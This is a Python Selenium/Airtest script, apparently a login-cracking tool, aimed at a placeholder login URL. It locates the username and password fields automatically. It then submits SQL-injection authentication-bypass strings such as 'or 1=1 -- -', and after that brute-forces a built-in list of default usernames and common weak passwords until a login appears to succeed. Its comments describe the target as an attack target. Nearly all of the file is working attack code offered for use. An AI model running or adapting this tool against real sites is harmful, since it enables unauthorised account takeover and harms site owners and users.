# -*- encoding=utf8 -*-
__author__ = "tiexinyang"

from airtest.core.api import *


from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from airtest_selenium.proxy import WebChrome
import re

auto_setup(__file__)


class cracker():
    def __init__(self,target_url):
        self.driver = WebChrome()
        self.driver.get(target_url)
        self.driver.implicitly_wait(20)

        self.exp_user_dic = ["admin' or 'a'='a", "'or'='or'", "admin' or '1'='1' or 1=1", "')or('a'='a", "'or 1=1 -- -"]
        self.exp_pass_dic = self.exp_user_dic
        self.static_user_dic = ['admin','system','sa','test','manager','root','user','www','web','username','guest','name','zhanghao','yonghu','email','account']
        self.suffix_dic = ['', '123', '888', '666', '123456']
        self.static_pass_dic = ['{user}', '123456', '{user}888', '12345678', '123123',  '88888888','888888','password','123456a',
                   '{user}123', '{user}123456', '{user}666','{user}2018', '123456789', '654321', '666666','66666666',
                   '1234567890', '8888888', '987654321','0123456789', '12345', '1234567','000000','111111','5201314','123123','pass','password',
                   'P@ssw0rd','P@ssw0rd2019','P@ssw0rd2020','P@ssw0rd2021']

        self.password_inputbox_id = ''
        self.username_inputbox_id = ''


    def find_element_ids(self):
        page_source = self.driver.page_source
        username_flags = ["user","account","用户名","邮箱","手机","证号"]
        rex_ele_id = re.compile(r'id="(\S*?)"')
        rex_username_ele = re.compile(r'(<input .*type="text".*?>)')
        rex_password_ele = re.compile(r'(<input .*type="password".*?>)')
        possible_username_eles = rex_username_ele.findall(page_source)
        username_ele = ''
        for possible_username_ele in possible_username_eles:
            if username_ele:
                break
            for username_flag in username_flags:
                if username_flag in possible_username_ele:
                    username_ele = possible_username_ele
                    break

        if not username_ele:
            self.username_inputbox_id = ''
        else:
            self.username_inputbox_id = rex_ele_id.findall(username_ele)[0]
            print("Uername Input Box ID:\t{}".format(self.username_inputbox_id))

        password_eles = rex_password_ele.findall(page_source)
        password_ele = password_eles[0] if password_eles else ''
        if not password_ele:
            self.password_input_id = ''
        else:
            self.password_inputbox_id = rex_ele_id.findall(password_ele)[0]
            print("Password Input Box ID:\t{}".format(self.password_inputbox_id))

        return True



    def brute_force(self,username,password):
        password = password.replace('{user}',username) if '{user}' in password else password
        print('Trying {0}:{1}'.format(username,password))

        username_ele = self.driver.find_element_by_id(self.username_inputbox_id) if self.username_inputbox_id else self.driver.find_element_by_xpath("//input[@type='text']")
        password_ele = self.driver.find_element_by_id(self.password_inputbox_id) if self.password_inputbox_id else self.driver.find_element_by_xpath("//input[@type='password']")
        username_ele.clear()
        username_ele.send_keys(username)
        password_ele.send_keys(password)
        password_ele.send_keys(Keys.RETURN)
        sleep(2)
        if self.password_inputbox_id in self.driver.page_source and self.username_inputbox_id in self.driver.page_source:
            print('Login Failed')
            return False
        else:
            print('Login Succeed')
            return True

    def loop(self,users,passwords):
        for user in users:
            for password in passwords:
                try:
                    ret = self.brute_force(user,password)
                    if ret:
                        return True
                except Exception as e:
                    print(e)
                    self.driver.refresh()
                    sleep(1)
        return False

    def run(self,userfile='',passfile=''):
        self.find_element_ids()
        if userfile and passfile:
            users = open(userfile).read().strip('\n').split('\n')
            passwords = open(passfile).read().strip('\n').split('\n')
            if loop(users,passwords):
                print("爆破成功")
                input()
        else:
            print("Loading inject users/passwords")
            users = self.exp_user_dic
            passwords = self.exp_pass_dic
            if self.loop(users,passwords):
                print("爆破成功")
                input()            

            print("Loding default account pairs")
            users = []
            for suffix in self.suffix_dic:
                for user in self.static_user_dic:
                    users.append(user+suffix)
            passwords = self.static_pass_dic
            if self.loop(users,passwords):
                print("爆破成功")
                input()



#定义攻击目标登录地址
target_url = 'https://somewhere/login.html'
#开始爆破(可自定义字典，或者使用默认字典)
cracker(target_url).run()
#cracker(target_url).run('users.txt','pass.txt')
